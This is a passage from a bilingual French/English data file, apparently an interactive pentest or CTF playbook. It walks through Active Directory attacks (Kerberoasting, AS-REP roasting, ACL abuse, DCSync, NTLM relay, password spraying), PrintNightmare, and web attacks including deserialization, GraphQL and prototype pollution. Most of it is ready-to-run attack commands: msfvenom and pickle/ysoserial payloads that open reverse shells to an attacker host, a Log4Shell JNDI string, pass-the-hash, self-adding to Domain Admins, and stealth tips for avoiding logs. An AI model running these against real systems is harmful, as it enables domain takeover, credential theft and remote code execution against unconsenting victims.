      { label: "Password spray sur les users trouvés", label_en: "Password spray on found users", next: "password_spray", icon: "💦" }
    ]
  },

  "ad_user_enum": {
    id: "ad_user_enum", title: "AD — Énumération des Utilisateurs", title_en: "AD — User Enumeration", category: "network", icon: "👥",
    description: "Récupérer la liste des utilisateurs du domaine sans credentials. Base pour ASREPRoasting et password spray.",
    description_en: "Retrieve the domain user list without credentials. Foundation for ASREPRoasting and password spraying.",
    commands: [
      { label: "Kerbrute — énumération via Kerberos", label_en: "Kerbrute — enumeration via Kerberos", cmd: "kerbrute userenum --dc TARGET_IP -d DOMAIN.LOCAL /usr/share/metasploit-framework/data/wordlists/unix_users.txt" },
      { label: "RPC null session", label_en: "RPC null session", cmd: "rpcclient -U '' -N TARGET_IP -c 'enumdomusers'\nrpcclient -U '' -N TARGET_IP -c 'enumdomusers' | grep -oP '\\[.*?\\]' | grep -v 0x" },
      { label: "LDAP anonymous bind", label_en: "LDAP anonymous bind", cmd: "ldapsearch -x -H ldap://TARGET_IP -b 'DC=DOMAIN,DC=LOCAL' '(objectClass=user)' sAMAccountName | grep sAMAccountName" },
      { label: "SMB null session avec crackmapexec", label_en: "SMB null session with crackmapexec", cmd: "crackmapexec smb TARGET_IP -u '' -p '' --users\ncrackmapexec smb TARGET_IP -u 'guest' -p '' --users" },
      { label: "Impacket lookupsid", label_en: "Impacket lookupsid", cmd: "impacket-lookupsid DOMAIN/anonymous@TARGET_IP\nimpacket-lookupsid 'DOMAIN/guest:@TARGET_IP'" }
    ],
    lookfor: [
      "Liste d'utilisateurs valides du domaine",
      "Compte guest ou invité actif",
      "Comptes de service (souvent avec SPNs → Kerberoasting)"
    ],
    lookfor_en: [
      "Valid domain user list",
      "Active guest or anonymous account",
      "Service accounts (often with SPNs → Kerberoasting)"
    ],
    tips: [
      "Kerbrute est furtif : valide les usernames sans générer de log d'échec d'auth",
      "Sauvegarder la liste des users → input pour ASREPRoasting et password spray"
    ],
    tips_en: [
      "Kerbrute is stealthy: validates usernames without generating authentication failure logs",
      "Save the user list → use as input for ASREPRoasting and password spray"
    ],
    choices: [
      { label: "Liste d'users récupérée → ASREPRoasting", label_en: "User list retrieved → ASREPRoasting", next: "asreproasting", icon: "🎟️" },
      { label: "Liste d'users récupérée → Password spray", label_en: "User list retrieved → Password spray", next: "password_spray", icon: "💦" },
      { label: "Credentials trouvés (guest, null session)", label_en: "Credentials found (guest, null session)", next: "bloodhound", icon: "🐕" }
    ]
  },

  "asreproasting": {
    id: "asreproasting", title: "AS-REP Roasting", title_en: "AS-REP Roasting", category: "network", icon: "🎟️",
    description: "Les comptes AD sans pré-authentification Kerberos ('Do not require Kerberos preauthentication') retournent un hash AS-REP crackable offline sans credentials.",
    description_en: "AD accounts without Kerberos pre-authentication ('Do not require Kerberos preauthentication') return an AS-REP hash that can be cracked offline without any credentials.",
    commands: [
      { label: "Impacket GetNPUsers — sans credentials", label_en: "Impacket GetNPUsers — without credentials", cmd: "impacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip TARGET_IP -no-pass -usersfile users.txt\nimpacket-GetNPUsers DOMAIN.LOCAL/ -dc-ip TARGET_IP -no-pass -request" },
      { label: "Impacket avec credentials", label_en: "Impacket with credentials", cmd: "impacket-GetNPUsers DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request" },
      { label: "Rubeus — depuis Windows", label_en: "Rubeus — from Windows", cmd: "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt" },
      { label: "Cracker le hash AS-REP avec hashcat", label_en: "Crack AS-REP hash with hashcat", cmd: "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" }
    ],
    lookfor: [
      "Hash format : $krb5asrep$23$USER@DOMAIN:...",
      "Comptes de service souvent vulnérables",
      "Mode hashcat 18200 = Kerberos 5 AS-REP etype 23"
    ],
    lookfor_en: [
      "Hash format: $krb5asrep$23$USER@DOMAIN:...",
      "Service accounts are often vulnerable",
      "Hashcat mode 18200 = Kerberos 5 AS-REP etype 23"
    ],
    tips: [
      "Sans credentials : utiliser GetNPUsers avec -no-pass et une liste d'utilisateurs",
      "Combiner avec les règles hashcat pour varier le wordlist",
      "Hash cracké → credential AD valide → BloodHound"
    ],
    tips_en: [
      "Without credentials: use GetNPUsers with -no-pass and a user list",
      "Combine with hashcat rules to vary the wordlist",
      "Cracked hash → valid AD credential → BloodHound"
    ],
    choices: [
      { label: "Hash AS-REP cracké → credentials AD", label_en: "AS-REP hash cracked → AD credentials", next: "bloodhound", icon: "🐕" },
      { label: "Credentials → SMB/WinRM/accès", label_en: "Credentials → SMB/WinRM/access", next: "smb_authenticated", icon: "🪟" }
    ]
  },

  "kerberoasting": {
    id: "kerberoasting", title: "Kerberoasting", title_en: "Kerberoasting", category: "network", icon: "🦴",
    description: "Demander des tickets TGS pour les comptes de service avec SPN puis cracker leurs hashes offline. Nécessite des credentials AD valides.",
    description_en: "Request TGS tickets for service accounts with an SPN, then crack their hashes offline. Requires valid AD credentials.",
    commands: [
      { label: "Impacket GetUserSPNs — lister et dumper", label_en: "Impacket GetUserSPNs — list and dump", cmd: "impacket-GetUserSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request\nimpacket-GetUserSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request -outputfile kerberoast.txt" },
      { label: "Rubeus — depuis Windows", label_en: "Rubeus — from Windows", cmd: "Rubeus.exe kerberoast /outfile:tgs.txt /format:hashcat" },
      { label: "PowerView — lister les SPNs", label_en: "PowerView — list SPNs", cmd: "Get-NetUser -SPN | Select-Object sAMAccountName,servicePrincipalName" },
      { label: "Cracker avec hashcat", label_en: "Crack with hashcat", cmd: "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" }
    ],
    lookfor: [
      "Hash format : $krb5tgs$23$*SERVICE*... → mode hashcat 13100",
      "Comptes de service avec SPN : SQLService, IIS, HTTP, MSSQLSvc",
      "Comptes de service ont souvent des mots de passe simples/anciens"
    ],
    lookfor_en: [
      "Hash format: $krb5tgs$23$*SERVICE*... → hashcat mode 13100",
      "Service accounts with SPN: SQLService, IIS, HTTP, MSSQLSvc",
      "Service accounts often have simple or old passwords"
    ],
    tips: [
      "Cibler les comptes avec SPNs membres de groupes à privilèges (Domain Admins)",
      "Les comptes de service sont souvent configurés une fois et jamais changés → mots de passe faibles",
      "RC4 (etype 23) = hashcat plus rapide qu'AES (etype 18)"
    ],
    tips_en: [
      "Target SPN accounts that are members of privileged groups (Domain Admins)",
      "Service accounts are often set once and never changed → weak passwords",
      "RC4 (etype 23) = hashcat cracks faster than AES (etype 18)"
    ],
    choices: [
      { label: "Hash TGS cracké → accès compte service", label_en: "TGS hash cracked → service account access", next: "bloodhound", icon: "🐕" },
      { label: "Compte service = admin local → accès machine", label_en: "Service account = local admin → machine access", next: "smb_authenticated", icon: "🪟" }
    ]
  },

  "bloodhound": {
    id: "bloodhound", title: "BloodHound — Cartographie AD", title_en: "BloodHound — AD Mapping", category: "network", icon: "🐕",
    description: "BloodHound analyse les relations entre objets AD et trouve les chemins vers Domain Admin. Vue graphique des vecteurs d'attaque qui ne seraient jamais trouvés manuellement.",
    description_en: "BloodHound analyzes relationships between AD objects and finds paths to Domain Admin. Graphical view of attack vectors that would never be found manually.",
    commands: [
      { label: "Collecter les données (SharpHound / bloodhound-python)", label_en: "Collect data (SharpHound / bloodhound-python)", cmd: "# Depuis Linux (plus pratique) :\npip3 install bloodhound\nbloodhound-python -u USER -p PASSWORD -d DOMAIN.LOCAL -dc TARGET_IP -c all --zip\n# Depuis Windows :\n.\\SharpHound.exe -c All --zipfilename bh_data.zip" },
      { label: "Lancer BloodHound + Neo4j", label_en: "Launch BloodHound + Neo4j", cmd: "sudo neo4j start\nbloodhound  # GUI\n# Importer le zip depuis l'interface" },
      { label: "Queries prédéfinies utiles", label_en: "Useful pre-built queries", cmd: "# Dans BloodHound :\n'Find Shortest Paths to Domain Admins'\n'Find All Domain Admins'\n'Find Computers with Unsupported Operating Systems'\n'Users with DCSync Rights'\n'Principals with DCSync Rights'" },
      { label: "Marquer les éléments compromis", label_en: "Mark compromised nodes as Owned", cmd: "# Clic droit sur un nœud → Mark as Owned\n# BloodHound recalcule les paths depuis vos owned nodes" }
    ],
    lookfor: [
      "Chemin le plus court vers Domain Admins",
      "GenericAll, GenericWrite, WriteDACL, ForceChangePassword sur des comptes importants",
      "Comptes avec DCSync rights (DS-Replication-Get-Changes-All)",
      "ACEs permissives sur des OUs ou objets",
      "Kerberoastable accounts dans le chemin vers DA"
    ],
    lookfor_en: [
      "Shortest path to Domain Admins",
      "GenericAll, GenericWrite, WriteDACL, ForceChangePassword on important accounts",
      "Accounts with DCSync rights (DS-Replication-Get-Changes-All)",
      "Permissive ACEs on OUs or objects",
      "Kerberoastable accounts in the path to DA"
    ],
    tips: [
      "Marquer chaque nœud compromis comme 'Owned' → BloodHound montre les nouveaux chemins",
      "Les ACEs abusables (GenericAll, WriteDACL) permettent souvent d'escalader sans exploit",
      "Chercher 'AS-REP Roastable Users' et 'Kerberoastable Users' directement"
    ],
    tips_en: [
      "Mark each compromised node as 'Owned' → BloodHound shows new attack paths from owned nodes",
      "Abusable ACEs (GenericAll, WriteDACL) often allow escalation without any exploit",
      "Directly search 'AS-REP Roastable Users' and 'Kerberoastable Users'"
    ],
    choices: [
      { label: "Chemin vers DA trouvé via ACE abusable", label_en: "Path to DA found via abusable ACE", next: "ad_acl_abuse", icon: "🎯" },
      { label: "DCSync rights trouvés", label_en: "DCSync rights found", next: "dcsync", icon: "👑" },
      { label: "Kerberoastable user dans le chemin", label_en: "Kerberoastable user in the path", next: "kerberoasting", icon: "🦴" },
      { label: "Owned un admin local → mouvement latéral", label_en: "Owned a local admin → lateral movement", next: "smb_authenticated", icon: "🔄" }
    ]
  },

  "ad_acl_abuse": {
    id: "ad_acl_abuse", title: "AD — Abus d'ACLs / Droits Délégués", title_en: "AD — ACL Abuse / Delegated Rights", category: "network", icon: "🎯",
    description: "BloodHound révèle souvent des ACEs permissives : GenericAll, WriteDACL, ForceChangePassword, AddMember. Chacune donne un vecteur d'escalade.",
    description_en: "BloodHound often reveals permissive ACEs: GenericAll, WriteDACL, ForceChangePassword, AddMember. Each provides an escalation vector.",
    commands: [
      { label: "ForceChangePassword — changer le mot de passe", label_en: "ForceChangePassword — change the password", cmd: "net rpc password TARGET_USER NewPassword123 -U DOMAIN/YOUR_USER%YOUR_PASS -S DC_IP\n# Ou PowerView :\nSet-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)" },
      { label: "GenericAll sur un user → changer mot de passe ou SPN", label_en: "GenericAll on a user → change password or SPN", cmd: "# Ajouter un SPN pour Kerberoasting :\nSet-DomainObject -Identity TARGET_USER -Set @{serviceprincipalname='fake/BLAH'}\nimpacket-GetUserSPNs DOMAIN/YOUR_USER:PASS -dc-ip DC_IP -request" },
      { label: "AddMember sur un groupe — ajouter à Domain Admins", label_en: "AddMember on a group — add to Domain Admins", cmd: "net rpc group addmem 'Domain Admins' YOUR_USER -U DOMAIN/YOUR_USER%PASS -S DC_IP\n# Ou PowerView :\nAdd-DomainGroupMember -Identity 'Domain Admins' -Members YOUR_USER" },
      { label: "WriteDACL → donner des droits DCSync", label_en: "WriteDACL → grant DCSync rights", cmd: "Add-DomainObjectAcl -TargetIdentity 'DC01.DOMAIN.LOCAL' -PrincipalIdentity YOUR_USER -Rights DCSync" },
      { label: "GenericAll sur une OU — descendance", label_en: "GenericAll on an OU — inheritance", cmd: "# Tout objet dans l'OU → GenericAll transitionnel\n# PowerView : Invoke-ACLScanner -ResolveGUIDs" }
    ],
    lookfor: [
      "GenericAll = contrôle total sur l'objet",
      "GenericWrite = modifier des attributs (SPN, logon script)",
      "ForceChangePassword = changer le mot de passe sans le connaître",
      "AddMember = ajouter n'importe qui à un groupe",
      "WriteDACL = modifier les droits sur l'objet"
    ],
    lookfor_en: [
      "GenericAll = full control over the object",
      "GenericWrite = modify attributes (SPN, logon script)",
      "ForceChangePassword = change password without knowing it",
      "AddMember = add anyone to a group",
      "WriteDACL = modify rights on the object"
    ],
    tips: [
      "BloodHound 'Abuse Info' pour chaque edge explique comment l'exploiter",
      "Après escalade → nettoyer (supprimer SPN ajouté, retirer du groupe) pour être discret",
      "Enchaîner les ACEs : user A → GenericAll sur user B → DA"
    ],
    tips_en: [
      "BloodHound 'Abuse Info' for each edge explains how to exploit it",
      "After escalation → clean up (remove added SPN, leave group) to stay stealthy",
      "Chain ACEs: user A → GenericAll on user B → DA"
    ],
    choices: [
      { label: "Membre Domain Admins obtenu", label_en: "Domain Admins membership obtained", next: "dcsync", icon: "👑" },
      { label: "SPN ajouté → Kerberoasting du compte", label_en: "SPN added → Kerberoasting the account", next: "kerberoasting", icon: "🦴" }
    ]
  },

  "dcsync": {
    id: "dcsync", title: "DCSync — Dump de tous les hashes AD", title_en: "DCSync — Dump All AD Hashes", category: "network", icon: "👑",
    description: "Simuler un Domain Controller pour demander la réplication des hashes NTLM de tous les comptes AD. Nécessite DS-Replication-Get-Changes-All. → Credentials de tous les comptes, dont Administrator.",
    description_en: "Simulate a Domain Controller to request replication of NTLM hashes for all AD accounts. Requires DS-Replication-Get-Changes-All. → Credentials for all accounts including Administrator.",
    commands: [
      { label: "Impacket secretsdump — DCSync", label_en: "Impacket secretsdump — DCSync", cmd: "impacket-secretsdump DOMAIN.LOCAL/USER:PASSWORD@DC_IP\nimpacket-secretsdump -hashes :NTLM_HASH DOMAIN.LOCAL/USER@DC_IP" },
      { label: "Cibler uniquement le compte Administrator", label_en: "Target only the Administrator account", cmd: "impacket-secretsdump DOMAIN.LOCAL/USER:PASSWORD@DC_IP -just-dc-user Administrator" },
      { label: "Mimikatz — depuis Windows", label_en: "Mimikatz — from Windows", cmd: "lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator\nlsadump::dcsync /domain:DOMAIN.LOCAL /all /csv" },
      { label: "Utiliser le hash NTLM de l'Administrator", label_en: "Use the Administrator NTLM hash", cmd: "# Pass-the-Hash sur tout le domaine :\nimpacket-psexec -hashes :NTLM_HASH Administrator@TARGET_IP\nevil-winrm -i DC_IP -u Administrator -H NTLM_HASH\ncrackmapexec smb SUBNET/24 -u Administrator -H NTLM_HASH" }
    ],
    lookfor: [
      "Hash NTLM de krbtgt → Golden Ticket possible",
      "Hash NTLM de Administrator → accès à tout le domaine",
      "Comptes de service avec mots de passe réutilisés"
    ],
    lookfor_en: [
      "krbtgt NTLM hash → Golden Ticket possible",
      "Administrator NTLM hash → access to the entire domain",
      "Service accounts with reused passwords"
    ],
    tips: [
      "DCSync sans être DA : si vous avez WriteDACL sur le domaine → vous octroyer les droits de réplication",
      "Hash krbtgt → Golden Ticket = persistence totale, valable 10 ans par défaut",
      "Pass-the-hash avec le NTLM admin → compromission complète du domaine"
    ],
    tips_en: [
      "DCSync without being DA: if you have WriteDACL on the domain → grant yourself replication rights",
      "krbtgt hash → Golden Ticket = full persistence, valid for 10 years by default",
      "Pass-the-hash with admin NTLM → complete domain compromise"
    ],
    choices: [
      { label: "Hash Administrator → root sur tout le domaine", label_en: "Administrator hash → root across the entire domain", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  "smb_relay": {
    id: "smb_relay", title: "SMB Relay / NTLM Relay (ntlmrelayx)", title_en: "SMB Relay / NTLM Relay (ntlmrelayx)", category: "network", icon: "🔄",
    description: "Relayer les authentifications NTLM capturées vers d'autres services. Plus puissant que le simple crackage — exploitation directe sans casser le hash.",
    description_en: "Relay captured NTLM authentications to other services. More powerful than simple cracking — direct exploitation without cracking the hash.",
    commands: [
      { label: "Désactiver Responder SMB/HTTP (pour relayer)", label_en: "Disable Responder SMB/HTTP (to relay)", cmd: "# Dans /etc/responder/Responder.conf :\n# SMB = Off\n# HTTP = Off\nsudo responder -I tun0 -dwPv" },
      { label: "Lancer ntlmrelayx en parallèle", label_en: "Launch ntlmrelayx in parallel", cmd: "# Cibler une liste de machines Windows :\nimpacket-ntlmrelayx -tf targets.txt -smb2support\n# Relayer vers LDAP pour créer un utilisateur DA :\nimpacket-ntlmrelayx -t ldap://DC_IP --escalate-user YOUR_USER" },
      { label: "Déclencher l'authentification", label_en: "Trigger authentication", cmd: "# Créer un fichier .scf ou .lnk dans un partage SMB accessible\n# Ou attendre une authentification naturelle" },
      { label: "ntlmrelayx avec socks proxy", label_en: "ntlmrelayx with socks proxy", cmd: "impacket-ntlmrelayx -tf targets.txt -smb2support -socks\n# Puis : proxychains impacket-secretsdump -no-pass DOMAIN/USER@TARGET" },
      { label: "Identifier les machines sans signing", label_en: "Identify machines without signing", cmd: "crackmapexec smb SUBNET/24 --gen-relay-list targets.txt\n# Machines sans 'signing:True' = cibles valides pour relay" }
    ],
    lookfor: [
      "SMB signing désactivé sur les cibles (crackmapexec le montre)",
      "Trafic NTLM sur le réseau (déclenché par fichiers .lnk, SCF, XML)",
      "Machines Windows sans patch KB3011780"
    ],
    lookfor_en: [
      "SMB signing disabled on targets (crackmapexec shows this)",
      "NTLM traffic on the network (triggered by .lnk, SCF, XML files)",
      "Windows machines without patch KB3011780"
    ],
    tips: [
      "SMB relay ne fonctionne pas si SMB signing est requis → vérifier en premier",
      "ntlmrelayx peut relayer vers LDAPS pour créer des comptes ou modifier des ACLs",
      "IPv6 MITM (mitm6) + ntlmrelayx = très efficace même avec signing activé"
    ],
    tips_en: [
      "SMB relay does not work if SMB signing is required → check first",
      "ntlmrelayx can relay to LDAPS to create accounts or modify ACLs",
      "IPv6 MITM (mitm6) + ntlmrelayx = very effective even with signing enabled"
    ],
    choices: [
      { label: "Shell obtenu sur machine cible via relay", label_en: "Shell obtained on target machine via relay", next: "shell_windows", icon: "💥" },
      { label: "Droits AD modifiés via LDAP relay", label_en: "AD rights modified via LDAP relay", next: "dcsync", icon: "👑" }
    ]
  },

  "password_spray": {
    id: "password_spray", title: "Password Spraying", title_en: "Password Spraying", category: "network", icon: "💦",
    description: "Tester UN mot de passe sur TOUS les comptes (inverse du brute force ciblé). Évite le lockout. Très efficace sur AD avec des mots de passe de saison.",
    description_en: "Test ONE password against ALL accounts (inverse of targeted brute force). Avoids lockout. Very effective on AD with seasonal passwords.",
    commands: [
      { label: "Kerbrute — spray via Kerberos (sans lockout log)", label_en: "Kerbrute — spray via Kerberos (no lockout log)", cmd: "kerbrute passwordspray --dc TARGET_IP -d DOMAIN.LOCAL users.txt 'Password2024'\nkerbrute passwordspray --dc TARGET_IP -d DOMAIN.LOCAL users.txt 'Welcome1'" },
      { label: "CrackMapExec — SMB spray", label_en: "CrackMapExec — SMB spray", cmd: "crackmapexec smb TARGET_IP -u users.txt -p 'Password123' --continue-on-success\ncrackmapexec smb TARGET_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success" },
      { label: "Spray AD via LDAP", label_en: "Spray AD via LDAP", cmd: "crackmapexec ldap TARGET_IP -u users.txt -p 'Password123' --continue-on-success" },
      { label: "Mots de passe courants à tester", label_en: "Common passwords to try", cmd: "# Saisonniers (très efficaces) :\nPassword2024! | Password2023!\nWelcome1 | Welcome2024!\nCompanyName2024 | CompanyName123!\nP@ssw0rd | P@ssword1\n# Mois + année :\nJanvier2024! | Spring2024!" },
      { label: "Vérifier la politique de lockout", label_en: "Check lockout policy", cmd: "crackmapexec smb TARGET_IP -u USER -p PASS --pass-pol\n# Compter le nombre de tentatives avant lockout !" }
    ],
    lookfor: [
      "Politique de lockout : combien de tentatives avant lock ?",
      "Observation Threshold = 0 → pas de lockout → brute force possible",
      "Résultat crackmapexec : [+] = succès"
    ],
    lookfor_en: [
      "Lockout policy: how many attempts before lockout?",
      "Observation Threshold = 0 → no lockout → brute force possible",
      "crackmapexec result: [+] = success"
    ],
    tips: [
      "TOUJOURS vérifier la politique de lockout avant de sprayer",
      "Attendre au moins 30 min entre chaque spray pour réinitialiser le compteur",
      "Les comptes de service et admins ont souvent été créés avec des mots de passe prévisibles"
    ],
    tips_en: [
      "ALWAYS check the lockout policy before spraying",
      "Wait at least 30 minutes between sprays to reset the counter",
      "Service and admin accounts are often created with predictable passwords"
    ],
    choices: [
      { label: "Credentials AD trouvés", label_en: "AD credentials found", next: "bloodhound", icon: "🐕" },
      { label: "Accès WinRM/SMB obtenu", label_en: "WinRM/SMB access obtained", next: "smb_authenticated", icon: "🪟" }
    ]
  },

  "printnightmare": {
    id: "printnightmare", title: "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)", title_en: "PrintNightmare (CVE-2021-1675 / CVE-2021-34527)", category: "exploit", icon: "🖨️",
    description: "Vulnérabilité du service Windows Print Spooler. Permet RCE et LPE. Exploitable sur Windows 10/Server 2016/2019 non patché.",
    description_en: "Vulnerability in the Windows Print Spooler service. Enables RCE and LPE. Exploitable on unpatched Windows 10/Server 2016/2019.",
    commands: [
      { label: "Vérifier si le service Print Spooler tourne", label_en: "Check if the Print Spooler service is running", cmd: "crackmapexec smb TARGET_IP -u USER -p PASS -M spooler\n# Ou PowerShell : Get-Service -Name Spooler" },
      { label: "LPE (Local Privilege Escalation) depuis un shell", label_en: "LPE (Local Privilege Escalation) from a shell", cmd: "# Impacket CVE-2021-1675\npython3 CVE-2021-1675.py DOMAIN/USER:PASS@TARGET_IP '\\\\YOUR_IP\\share\\evil.dll'" },
      { label: "Préparer la DLL malveillante", label_en: "Prepare the malicious DLL", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f dll -o evil.dll\n# Partager via SMB :\nimpacket-smbserver share ./  -smb2support" },
      { label: "RCE remote (SharpPrintNightmare)", label_en: "Remote RCE (SharpPrintNightmare)", cmd: "# Via Metasploit :\nuse exploit/windows/dcerpc/cve_2021_1675_printspooler\nset RHOSTS TARGET_IP && set LHOST YOUR_IP && run" }
    ],
    lookfor: ["Service Spooler actif sur Windows Server", "Patch KB5004945 absent = vulnérable"],
    lookfor_en: ["Spooler service active on Windows Server", "Patch KB5004945 missing = vulnerable"],
    tips: [
      "Tester LPE depuis un shell bas privilèges d'abord",
      "Créer une DLL qui ajoute un compte admin plutôt que reverse shell (plus stable)"
    ],
    tips_en: [
      "Test LPE from a low-privilege shell first",
      "Create a DLL that adds an admin account rather than a reverse shell (more stable)"
    ],
    choices: [
      { label: "SYSTEM obtenu via PrintNightmare", label_en: "SYSTEM obtained via PrintNightmare", next: "privesc_windows_post", icon: "👑" }
    ]
  },

  // ── WEB AVANCÉ ────────────────────────────────────────────────────────────────
  "web_deserialization": {
    id: "web_deserialization", title: "Désérialisation Insécurisée", title_en: "Insecure Deserialization", category: "web", icon: "🔄",
    description: "Désérialiser des données contrôlées par l'utilisateur peut mener à du RCE. Java, Python (pickle), PHP (unserialize), Ruby sont les plus touchés en CTF.",
    description_en: "Deserializing user-controlled data can lead to RCE. Java, Python (pickle), PHP (unserialize), and Ruby are most commonly affected in CTF.",
    commands: [
      { label: "Java — ysoserial (gadget chains)", label_en: "Java — ysoserial (gadget chains)", cmd: "# Identifier : cookie Base64 contenant AC ED 00 05 (magic bytes Java)\nfile payload.ser  # 'Java serialized data'\n# Générer payload ysoserial :\njava -jar ysoserial.jar CommonsCollections6 'bash -c {bash,-i,>&,/dev/tcp/YOUR_IP/4444,0>&1}' | base64 -w 0" },
      { label: "Python Pickle — RCE trivial", label_en: "Python Pickle — trivial RCE", cmd: "# Code vulnérable : pickle.loads(user_data)\nimport pickle, os, base64\nclass Exploit(object):\n    def __reduce__(self):\n        return (os.system, ('bash -i >& /dev/tcp/YOUR_IP/4444 0>&1',))\nprint(base64.b64encode(pickle.dumps(Exploit())).decode())" },
      { label: "PHP unserialize — chercher gadget chain", label_en: "PHP unserialize — find gadget chain", cmd: "# Identifier : O:4:\"User\":... dans cookie/paramètre\n# Générer avec phpggc :\nphpggc Laravel/RCE1 system 'id' -b\n# Ou chercher les classes existantes dans le code source" },
      { label: "Détecter la désérialisation Java", label_en: "Detect Java deserialization", cmd: "# Magic bytes : aced0005 (hex) ou rO0AB (base64)\necho 'rO0AB' | base64 -d | xxd | head\n# Burp Suite : chercher dans les cookies, POST body, headers" },
      { label: "JNDI Injection (Log4Shell CVE-2021-44228)", label_en: "JNDI Injection (Log4Shell CVE-2021-44228)", cmd: "# Si Log4j 2.0-2.14 :\n${jndi:ldap://YOUR_IP:1389/a}\n# Dans les headers : User-Agent, X-Forwarded-For, username\n# Outil : marshalsec pour serveur LDAP malveillant" }
    ],
    lookfor: [
      "Magic bytes Java : AC ED 00 05 (hex) / rO0 (base64)",
      "Cookies base64 contenant des structures sérialisées",
      "Erreurs de désérialisation dans les logs",
      "Headers X-Java-Serialized-Object",
      "Paramètres viewstate (ASP.NET)"
    ],
    lookfor_en: [
      "Java magic bytes: AC ED 00 05 (hex) / rO0 (base64)",
      "Base64 cookies containing serialized structures",
      "Deserialization errors in logs",
      "X-Java-Serialized-Object headers",
      "viewstate parameters (ASP.NET)"
    ],
    tips: [
      "ysoserial.net pour .NET / ysoserial pour Java",
      "phpggc (PHP Generic Gadget Chains) pour PHP",
      "Log4Shell : tester dans TOUS les champs de saisie"
    ],
    tips_en: [
      "ysoserial.net for .NET / ysoserial for Java",
      "phpggc (PHP Generic Gadget Chains) for PHP",
      "Log4Shell: test in ALL input fields"
    ],
    choices: [
      { label: "RCE via désérialisation", label_en: "RCE via deserialization", next: "rce_found", icon: "💥" }
    ]
  },

  "web_graphql": {
    id: "web_graphql", title: "GraphQL — Enumération et Exploitation", title_en: "GraphQL — Enumeration and Exploitation", category: "web", icon: "⬡",
    description: "GraphQL exposé sans protection permet l'introspection complète du schéma, puis l'injection dans les resolvers ou la modification de données non autorisées.",
    description_en: "GraphQL exposed without protection allows full schema introspection, then injection into resolvers or unauthorized data modification.",
    commands: [
      { label: "Détecter GraphQL", label_en: "Detect GraphQL", cmd: "# Endpoints courants :\n/graphql\n/api/graphql\n/v1/graphql\n/graphiql\n# Tester :\ncurl -X POST http://TARGET/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}" },
      { label: "Introspection — dump du schéma complet", label_en: "Introspection — dump the full schema", cmd: "# Via curl :\ncurl -X POST http://TARGET/graphql -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__schema{types{name,fields{name,args{name,type{name}}}}}}\"}'  \n# Outil graphique : InQL (Burp plugin) ou GraphQL Voyager" },
      { label: "Bruteforce de champs (si introspection désactivée)", label_en: "Field brute force (if introspection disabled)", cmd: "# Clairvoyance — deviner les champs par dictionnaire :\npython3 clairvoyance.py -u http://TARGET/graphql -o schema.json" },
      { label: "Injection dans une query GraphQL", label_en: "Injection in a GraphQL query", cmd: "# SQL injection dans un argument :\n{users(id: \"1 OR 1=1\"){id name email}}\n# IDOR : changer l'ID dans une query\n{user(id: 2){email password}}" },
      { label: "Mutation sans autorisation", label_en: "Unauthorized mutation", cmd: "# Modifier des données sans être authentifié :\nmutation{updateUser(id:1,role:\"admin\"){id role}}" }
    ],
    lookfor: [
      "Introspection active = schéma complet lisible → chercher les champs sensibles",
      "Champs 'password', 'token', 'secret' dans le schéma",
      "Mutations non protégées = modification de données sans auth",
      "Injections dans les arguments (SQLi, NoSQLi)"
    ],
    lookfor_en: [
      "Active introspection = full schema readable → look for sensitive fields",
      "'password', 'token', 'secret' fields in the schema",
      "Unprotected mutations = data modification without auth",
      "Injections in arguments (SQLi, NoSQLi)"
    ],
    tips: [
      "GraphiQL (interface graphique) souvent disponible en dev → accès direct",
      "InQL Burp extension = introspection automatique + génération de queries",
      "Batch queries : envoyer plusieurs queries dans un tableau pour bypasser rate limiting"
    ],
    tips_en: [
      "GraphiQL (graphical UI) often available in dev → direct access",
      "InQL Burp extension = automatic introspection + query generation",
      "Batch queries: send multiple queries in an array to bypass rate limiting"
    ],
    choices: [
      { label: "Credentials trouvés via introspection/query", label_en: "Credentials found via introspection/query", next: "credentials_found", icon: "🏆" },
      { label: "Injection dans resolver → SQLi", label_en: "Injection in resolver → SQLi", next: "web_sqli_found", icon: "💉" },
      { label: "Mutation non protégée → escalade", label_en: "Unprotected mutation → escalation", next: "web_authenticated", icon: "⬆️" }
    ]
  },

  "web_prototype_pollution": {
    id: "web_prototype_pollution", title: "Prototype Pollution (Node.js)", title_en: "Prototype Pollution (Node.js)", category: "web", icon: "☣️",
    description: "Manipulation du prototype JavaScript Object via des clés spéciales (__proto__, constructor.prototype) pour modifier le comportement global de l'application → RCE ou bypass d'authentification.",
    description_en: "Manipulation of the JavaScript Object prototype via special keys (__proto__, constructor.prototype) to modify global application behavior → RCE or authentication bypass.",
    commands: [
      { label: "Test basique", label_en: "Basic test", cmd: "# Dans un paramètre JSON ou query string :\n{\"__proto__\":{\"admin\":true}}\n{\"constructor\":{\"prototype\":{\"admin\":true}}}\n# URL : ?__proto__[admin]=true" },
      { label: "Détecter la vulnérabilité", label_en: "Detect the vulnerability", cmd: "# Si la réponse contient 'admin:true' ou erreur différente\n# Test : envoyer {\"__proto__\":{\"isAdmin\":true}} puis accéder à /admin" },
      { label: "RCE via prototype pollution + template", label_en: "RCE via prototype pollution + template engine", cmd: "# Si l'app utilise ejs/handlebars :\n{\"__proto__\":{\"outputFunctionName\":\"x;process.mainModule.require('child_process').execSync('id > /tmp/pwn');x\"}}" },
